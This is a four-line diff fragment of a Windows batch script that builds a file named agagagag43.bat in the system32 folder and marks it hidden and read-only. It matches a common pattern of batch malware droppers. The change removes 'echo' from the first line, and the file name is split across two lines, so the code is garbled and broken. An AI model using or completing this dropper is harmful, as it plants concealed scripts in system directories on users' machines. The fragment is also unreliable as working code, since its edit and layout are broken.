@@ -1,4 +1,4 @@
-echo @echo off>>%systemroot%\system32\agagagag43.ba
+@echo off>>%systemroot%\system32\agagagag43.ba
 t
 echo Break off>>%systemroot%\system32\agagagag43.bat
 echo Attrib +r +h>>%systemroot%\system32\agagagag43.bat
